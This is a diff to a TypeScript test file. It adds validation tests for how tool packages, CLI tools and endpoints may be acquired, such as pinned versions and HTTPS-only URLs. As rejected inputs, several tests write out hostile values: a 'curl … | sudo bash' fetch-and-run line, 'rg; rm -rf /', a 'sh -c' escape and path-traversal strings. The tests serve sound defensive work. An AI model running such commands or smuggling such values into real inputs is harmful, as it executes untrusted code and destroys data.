@@ -2,6 +2,7 @@ import { describe, expect, it } from "vitest";
 
 import {
   acquisitionSourceSchema,
+  acquisitionUrlProblem,
   capabilityCandidateSchema,
   capabilityQuerySchema,
   discoveryBudgetSchema,
@@ -20,7 +21,7 @@ const candidate = {
   availability: "needs-acquisition",
   requires: { install: true, credential: false, networkOrigins: [] },
   acquisition: { kind: "package", source: { kind: "npm", name: "@example/pdf-tools", version: "1.2.0" } },
-  provenance: { providerId: "marketplace", origin: "https://marketplace.example", trust: "publisher-claimed", observedAt: at },
+  provenance: { providerId: "dprov_marketplace", origin: "https://marketplace.example", trust: "publisher-claimed", observedAt: at },
 };
 
 describe("a capability candidate", () => {
@@ -54,6 +55,19 @@ describe("a capability candidate", () => {
     const { acquisition: _left, ...bare } = candidate;
     expect(capabilityCandidateSchema.safeParse(bare).success).toBe(false);
   });
+
+  it("refuses a candidate that claims to be available while it still needs installing or a credential", () => {
+    const { acquisition: _left, ...bare } = candidate;
+    const local = { ...bare, source: "local", availability: "available" };
+    expect(capabilityCandidateSchema.safeParse({ ...local, requires: { install: false, credential: false, networkOrigins: [] } }).success).toBe(true);
+    expect(capabilityCandidateSchema.safeParse({ ...local, requires: { install: true, credential: false, networkOrigins: [] } }).success).toBe(false);
+    expect(capabilityCandidateSchema.safeParse({ ...local, requires: { install: false, credential: true, networkOrigins: [] } }).success).toBe(false);
+  });
+
+  it("names its discovery provider by a prefixed id", () => {
+    const unprefixed = { ...candidate, provenance: { ...candidate.provenance, providerId: "marketplace" } };
+    expect(capabilityCandidateSchema.safeParse(unprefixed).success).toBe(false);
+  });
 });
 
 describe("how a candidate may be acquired", () => {
@@ -71,6 +85,60 @@ describe("how a candidate may be acquired", () => {
     expect(acquisitionSourceSchema.safeParse({ kind: "mcp-endpoint", url: "http://mcp.example/sse" }).success).toBe(false);
     expect(acquisitionSourceSchema.safeParse({ kind: "mcp-endpoint", url: "https://user:pw@mcp.example/sse" }).success).toBe(false);
     expect(acquisitionSourceSchema.safeParse({ kind: "mcp-endpoint", url: "http://127.0.0.1:3000/mcp" }).success).toBe(true);
+  });
+
+  it("refuses a malformed address without throwing", () => {
+    const digest = `sha256:${"a".repeat(64)}`;
+    for (const url of ["not a url", "", "https://", "://x", "http//x.example", "https://[::1"]) {
+      for (const source of [
+        { kind: "mcp-endpoint", url },
+        { kind: "artifact", url, digest },
+        { kind: "openapi", url },
+        { kind: "package", source: { kind: "git", url, ref: "a".repeat(40) } },
+      ]) {
+        expect(() => acquisitionSourceSchema.safeParse(source)).not.toThrow();
+        expect(acquisitionSourceSchema.safeParse(source).success).toBe(false);
+      }
+    }
+    expect(acquisitionUrlProblem("not a url")).toBe("is not a URL");
+  });
+
+  it("accepts a command-line tool only from a known manager, by name, at an exact version", () => {
+    const cli = (fields: Record<string, unknown>) =>
+      acquisitionSourceSchema.safeParse({ kind: "cli-package", manager: "homebrew", name: "ripgrep", version: "14.1.1", ...fields }).success;
+    expect(cli({})).toBe(true);
+    expect(cli({ manager: "go", name: "golang.org/x/tools/gopls", version: "v0.16.2" })).toBe(true);
+    expect(cli({ manager: "npm", name: "@scope/tool", version: "1.2.3-beta.1" })).toBe(true);
+    expect(cli({ manager: "sh", name: "-c", version: "curl https://x.example/i.sh | sudo bash" })).toBe(false);
+    expect(cli({ manager: "sh" })).toBe(false);
+    expect(cli({ name: "-c" })).toBe(false);
+    expect(cli({ name: "rg; rm -rf /" })).toBe(false);
+    expect(cli({ version: "curl https://x.example/i.sh | sudo bash" })).toBe(false);
+    expect(cli({ version: "latest" })).toBe(false);
+    expect(cli({ version: "^14" })).toBe(false);
+    expect(cli({ version: ">=14.0.0" })).toBe(false);
+    expect(cli({ version: "14" })).toBe(false);
+  });
+
+  it("accepts a package only in a form that names exactly one set of bytes", () => {
+    const pkg = (source: Record<string, unknown>) => acquisitionSourceSchema.safeParse({ kind: "package", source }).success;
+    const commit = "0123456789abcdef0123456789abcdef01234567";
+    expect(pkg({ kind: "git", url: "https://github.com/example/tool.git", ref: commit })).toBe(true);
+    expect(pkg({ kind: "git", url: "http://github.com/example/tool.git", ref: commit })).toBe(false);
+    expect(pkg({ kind: "git", url: "http://127.0.0.1/tool.git", ref: commit })).toBe(false);
+    expect(pkg({ kind: "git", url: "https://github.com/example/tool.git", ref: "main" })).toBe(false);
+    expect(pkg({ kind: "git", url: "https://github.com/example/tool.git", ref: "v1.2.0" })).toBe(false);
+    expect(pkg({ kind: "git", url: "https://github.com/example/tool.git", ref: "0123456" })).toBe(false);
+    expect(pkg({ kind: "npm", name: "@example/pdf-tools", version: "1.2.0" })).toBe(true);
+    expect(pkg({ kind: "npm", name: "@example/pdf-tools", version: "^1" })).toBe(false);
+    expect(pkg({ kind: "npm", name: "@example/pdf-tools", version: "latest" })).toBe(false);
+    expect(pkg({ kind: "npm", name: "../evil", version: "1.0.0" })).toBe(false);
+    expect(pkg({ kind: "npm", name: "Upper", version: "1.0.0" })).toBe(false);
+    expect(pkg({ kind: "local", path: "/opt/tools/pdf" })).toBe(true);
+    expect(pkg({ kind: "local", path: "C:\\Tools\\pdf" })).toBe(true);
+    expect(pkg({ kind: "local", path: "../../etc" })).toBe(false);
+    expect(pkg({ kind: "local", path: "/opt/../etc" })).toBe(false);
+    expect(pkg({ kind: "local", path: "~/tools" })).toBe(false);
   });
 });
 
